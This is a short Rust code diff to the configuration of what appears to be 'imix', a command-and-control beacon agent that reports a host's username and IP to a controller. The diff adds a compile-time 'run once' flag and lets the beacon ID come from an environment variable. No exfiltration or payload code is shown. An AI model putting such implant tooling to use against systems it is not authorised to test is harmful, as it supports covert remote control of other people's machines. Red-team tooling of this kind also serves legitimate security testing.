@@ -11,6 +11,8 @@ pub struct Config {
     pub proxy_uri: ::core::option::Option<::prost::alloc::string::String>,
     #[prost(uint64, tag = "4")]
     pub retry_interval: u64,
+    #[prost(bool, tag = "5")]
+    pub run_once: bool,
 }
 
 macro_rules! callback_uri {
@@ -64,6 +66,20 @@ macro_rules! retry_interval {
  */
 pub const RETRY_INTERVAL: &str = retry_interval!();
 
+macro_rules! run_once {
+    () => {
+        match option_env!("IMIX_RUN_ONCE") {
+            Some(_) => true,
+            None => false,
+        }
+    };
+}
+
+/* Compile-time constant for the agent run once flag, derived from the IMIX_RUN_ONCE environment variable during compilation.
+ * Defaults to false if unset.
+ */
+pub const RUN_ONCE: bool = run_once!();
+
 /*
  * Config methods.
  */
@@ -82,8 +98,12 @@ impl Config {
             primary_ip: get_primary_ip(),
         };
 
+        // Try to grab the beacon identitifier from env var, o/w use  a random UUID
+        let beacon_id =
+            std::env::var("IMIX_BEACON_ID").unwrap_or_else(|_| String::from(Uuid::new_v4()));
+
         let info = crate::c2::Beacon {
-            identifier: String::from(Uuid::new_v4()),
+            identifier: beacon_id,
             principal: whoami::username(),
             interval: match CALLBACK_INTERVAL.parse::<u64>() {
                 Ok(i) => i,
@@ -113,6 +133,7 @@ impl Config {
                     5
                 }
             },
+            run_once: RUN_ONCE,
         }
     }
     pub fn refresh_primary_ip(&mut self) {
